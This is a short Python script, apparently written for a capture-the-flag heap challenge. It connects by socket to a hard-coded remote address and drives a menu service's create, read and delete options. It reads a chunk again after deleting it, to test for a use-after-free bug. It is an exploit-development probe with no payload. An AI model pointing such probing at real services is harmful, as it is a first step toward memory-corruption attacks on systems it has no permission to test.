import socket, time

def recv_all(s, timeout=0.4, count=10):
    out=b''
    s.settimeout(timeout)
    for _ in range(count):
        try:
            r=s.recv(8192)
            if not r: break
            out+=r
        except:
            break
    return out

host='52.76.96.108'; port=9005

def create(idx, size, data):
    s.sendall(b"1\n"); time.sleep(0.1); recv_all(s)
    s.sendall(str(idx).encode()+b"\n"); time.sleep(0.1); recv_all(s)
    s.sendall(str(size).encode()+b"\n"); time.sleep(0.1); recv_all(s)
    s.sendall(data); time.sleep(0.1); return recv_all(s)

def read(idx):
    s.sendall(b"4\n"); time.sleep(0.1); recv_all(s)
    s.sendall(str(idx).encode()+b"\n"); time.sleep(0.1); return recv_all(s)

def delete(idx):
    s.sendall(b"3\n"); time.sleep(0.1); recv_all(s)
    s.sendall(str(idx).encode()+b"\n"); time.sleep(0.1); return recv_all(s)

def menu():
    return recv_all(s,0.2,3)

s=socket.socket(); s.settimeout(0.4); s.connect((host,port)); time.sleep(0.3)
print(s.recv(8192).decode(errors='replace'))

print("create[0] size 8", create(0,8,b"AAAAAAA\n"))
print(menu())
print("read[0]", read(0))
print("delete[0]", delete(0))
print("read[0] after delete (UAF?)", read(0))
print(menu())
s.close()
